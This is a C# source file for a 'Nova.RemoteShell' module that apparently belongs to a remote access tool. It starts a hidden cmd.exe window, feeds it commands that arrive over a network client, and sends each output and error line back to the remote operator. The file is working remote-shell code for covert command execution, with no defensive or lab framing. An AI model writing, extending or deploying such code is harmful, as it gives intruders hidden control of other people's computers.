using Nova.Commands;
using System;
using System.Diagnostics;

namespace Nova.RemoteShell
{
    public class Shell
    {
        private Process prc;

        private void CreateSession()
        {
            prc = new Process
            {
                StartInfo = new ProcessStartInfo("cmd")
                {
                    UseShellExecute = false,
                    RedirectStandardInput = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true,
                    WorkingDirectory = @"C:\",
                    Arguments = "/K",
                }
            };

            prc.Start();
            // ✅ 使用异步读取，不需要单独的 Redirect 线程
            prc.OutputDataReceived += (sender, e) =>
            {

                if (!string.IsNullOrEmpty(e.Data))
                {
                    CHandler.Execute(new Nova.Packets.ClientPackets.ShellCommandResponse(e.Data + Environment.NewLine),Program._client);
                }
            };

            prc.ErrorDataReceived += (sender, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                {
                    CHandler.Execute(new Nova.Packets.ClientPackets.ShellCommandResponse("[ERR] " + e.Data + Environment.NewLine),Program._client);
                }
            };

            prc.BeginOutputReadLine();
            prc.BeginErrorReadLine();

            CHandler.Execute(new Nova.Packets.ClientPackets.ShellCommandResponse(">> New Session created" + Environment.NewLine),Program._client);          
        }
        
        public bool ExecuteCommand(string command)
        {
            if (!prc.HasExited)
            {
                prc.StandardInput.WriteLine(command);
                prc.StandardInput.WriteLine();
                prc.StandardInput.Flush();
                return true;
            }
            return false;
        }

        public Shell()
        {
            CreateSession();
        }
        ~Shell()
        {
            try
            {
                if (!prc.HasExited)
                    prc.Kill();
            }
            catch
            { }
            CHandler.Execute(new Nova.Packets.ClientPackets.ShellCommandResponse(">> Session closed" + Environment.NewLine),Program._client);
        }
        public void CloseSession()
        {
            try
            {
                if (!prc.HasExited)
                    prc.Kill();
            }
            catch
            { }
            CHandler.Execute(new Nova.Packets.ClientPackets.ShellCommandResponse(">> Session closed" + Environment.NewLine),Program._client);
        }
    }
}
